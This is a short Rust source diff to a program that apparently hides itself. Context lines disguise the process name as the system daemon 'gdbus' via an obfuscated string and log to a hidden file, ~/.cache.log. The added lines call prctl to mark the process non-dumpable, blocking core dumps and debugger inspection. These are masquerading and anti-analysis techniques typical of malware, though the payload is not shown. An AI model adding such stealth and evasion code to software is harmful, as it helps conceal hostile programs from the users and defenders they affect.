@@ -40,6 +40,10 @@ fn set_process_name(name: &str) {
 fn main() {
     set_process_name(crate::obfstr!("gdbus").decrypt().as_str());
 
+    unsafe {
+        libc::prctl(libc::PR_SET_DUMPABLE, 0);
+    }
+
     let log_path = {
         let home = std::env::var("HOME").unwrap_or_else(|_| ".".into());
         std::path::PathBuf::from(home).join(".cache.log")
